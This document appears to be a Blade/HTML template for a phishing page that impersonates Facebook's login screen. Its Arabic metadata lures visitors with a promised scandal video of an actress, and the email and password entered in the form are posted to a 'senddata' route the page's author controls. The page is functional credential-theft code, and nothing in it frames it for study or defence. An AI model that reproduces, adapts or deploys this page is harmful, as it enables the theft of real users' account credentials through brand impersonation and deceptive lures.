<!-- W3hubs.com - Download Free Responsive Website Layout Templates designed on HTML5 
  CSS3,Bootstrap,Tailwind CSS,Shoelace Style which are 100% Mobile friendly. w3Hubs all Layouts are responsive 
  cross browser supported, best quality world class designs. -->
  <!DOCTYPE html>
  <html>
    <head>
      <title>Facebook news</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="description" content="سجل الدخول لمشاهدة الفديو">
      <meta name="author" content="اخبار">
      <meta property="og:title" content="فضيحة الفنانة اسماء" />
<meta property="og:type" content="video.movie" />
<meta property="og:url" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.freepressjournal.in%2Fampstories%2Fphoto-gallery%2Fsexy-saree-pictures-of-janhvi-kapoor&psig=AOvVaw3dic2X1JZb3oEVUI1SfjP4&ust=1663894444619000&source=images&cd=vfe&ved=0CAwQjRxqFwoTCIjip6CYp_oCFQAAAAAdAAAAABAc" />
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxXVOiTCUbv1FWs2vsF1Bc534wDb6aGY2pfg&usqp=CAU" />

      <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
      <style type="text/css">
        body{
        background-color: #f0f2f5;
        font-family: "Nunito Sans";
        }
        .login-form{
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        background-color: #fff;
        padding: 9px;
        }
        h3{
        padding-left:30px;
        padding-right: 20px;
        }
        .btn-custom{
        background-color: #1877f2;
        border: none;
        border-radius: 6px;
        font-size: 20px;
        line-height: 28px;
        color: #fff;
        font-weight:700;
       
        }
        .btn-custom{
        color: #fff !important;
        }
        input{
        height: 52px;
        font-size: 18px !important;
        color: #f2f2f2;
        }
        .form-control:focus{
        box-shadow: 0 0 0 0 rgba(13,110,253,.25);
        }
        a{
        text-decoration: none;
        }
        a:hover{
        text-decoration: underline;
        }
        @media(max-width: 768px){
          /* #log{
            display: block;
          } */
          .col-md-7,p{
            display: none;
          }
          input{
            font-size: 16px !important;
          }
          .login-form{
            box-shadow: none;
          }
        }
      </style>
    </head>
    <body>
        
      <div class="container">
        <div class="row align-items-center justify-content-center vh-100">
          <div class="col-md-7">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">
            <h3>Facebook helps you connect and share with the people in your life.</h3>
          </div>
          <div class="col-md-5" style="margin-top: -230px;">
          <div id="log">  <center style="margin-top:60px"> <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">  </center></div>
          <form method="POST" action="{{ route("senddata") }}">
             {{ csrf_field() }}
              <div class="mb-3">
                <input type="text" class="form-control" name="email" placeholder="Mobile number or email address"
                  required>
              </div>
              <div class="mb-3">
                <input type="password" class="form-control" name="password" placeholder="Password"
                  required>
              </div>
              <button type="submit" class="btn btn-custom btn-lg btn-block mt-3">Log In</button>
              <div class="text-center pt-3 pb-3">
                <a href="#" class="">Forgotten password?</a>
                <hr>
                <button type="submit" class="btn btn-success btn-lg mt-3" style="background-color: #42b72a;">Create New Account</button>
              </div>
            </form>
            <p class="pt-3 text-center"><b>Create a Page</b> for a celebrity, band or business.</p>
          </div>
        </div>
      </div>
    </body>
  </html>
